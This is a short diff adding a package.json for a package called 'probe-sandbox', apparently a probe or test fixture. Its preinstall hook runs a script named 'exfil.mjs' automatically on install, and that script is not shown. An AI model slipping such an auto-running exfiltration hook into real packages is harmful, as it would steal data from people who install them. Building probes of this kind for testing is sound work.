@@ -1,0 +1,8 @@
+{
+  "name": "probe-sandbox",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "node exfil.mjs",
+    "build": "node -e \"console.log('built')\""
+  }
+}
